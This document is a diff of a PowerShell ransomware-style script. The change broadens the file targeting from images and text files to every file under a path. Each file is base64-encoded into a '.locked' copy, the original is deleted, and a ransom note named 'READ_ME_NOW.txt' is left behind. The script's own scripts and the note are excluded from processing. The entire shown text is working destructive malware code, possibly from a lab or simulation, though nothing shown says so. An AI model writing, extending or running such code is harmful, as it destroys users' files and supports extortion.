@@ -9,8 +9,9 @@ $ransomNotePath = Join-Path $ResolvedPath "READ_ME_NOW.txt"
 Write-Host "[!] TARGET ACQUIRED: $ResolvedPath" -ForegroundColor Red
 
 # Exclude the note and already locked files
-Get-ChildItem -Path $ResolvedPath -Include *.jpg,*.png,*.txt -Exclude "READ_ME_NOW.txt","*.locked" -Recurse | ForEach-Object {
-    $content = [System.IO.File]::ReadAllBytes($_.FullName)
+# ENCRYPT EVERYTHING (Wildcard *)
+# We MUST exclude the ransom note, the scripts themselves, and already locked files
+Get-ChildItem -Path $ResolvedPath -Include * -Exclude "READ_ME_NOW.txt","*.locked","encrypt.ps1","decrypt.ps1","setup.ps1" -Recurse | ForEach-Object {    $content = [System.IO.File]::ReadAllBytes($_.FullName)
     $encoded = [System.Convert]::ToBase64String($content)
     $encoded | Set-Content ($_.FullName + ".locked")
     Remove-Item $_.FullName
